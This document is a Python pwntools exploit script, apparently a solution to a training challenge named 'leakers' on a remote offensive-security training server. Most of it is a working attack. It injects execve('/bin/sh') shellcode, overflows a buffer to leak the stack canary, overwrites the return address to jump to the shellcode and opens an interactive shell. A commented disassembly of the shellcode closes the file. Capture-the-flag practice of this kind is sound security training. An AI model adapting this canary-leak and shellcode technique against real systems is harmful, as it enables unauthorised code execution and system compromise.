from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./leakers")
    gdb.attach(r, """
        # b *0x00401200
        # b *0x401232
        # b *0x0401255
        #b *0x401348
        b *0x401316
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2010)

#r.sendline(b"thisisbsss")

shellcode = b"\x90\x90\x90\x90\x90\x48\xC7\xC7\xA0\x40\x40\x00\x48\x83\xC7\x1F\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
r.send(shellcode)
time.sleep(0.1)
print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

ret_address = b"\xa1\x40\x40\x00\x00\x00\x00\x00"
payload = b"A"*104 + p64(canary) + b"B"*8 + ret_address
#payload = b"A"*104 + p64(canary) + b"B"*8 + b"C"*8

r.send(payload)

time.sleep(0.1)

r.sendline(b"")

r.interactive()


""" 0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  90                      nop
4:  90                      nop
5:  48 c7 c7 a0 40 40 00    mov    rdi,0x4040a0
c:  48 83 c7 1f             add    rdi,0x1f
10: 48 31 f6                xor    rsi,rsi
13: 48 31 d2                xor    rdx,rdx
16: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
1d: 0f 05                   syscall
1f: 00                      .byte 0x0 
shellcode = b"\x90\x90\x90\x90\x90\x48\xC7\xC7\xA0\x40\x40\x00\x48\x83\xC7\x1F\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
"""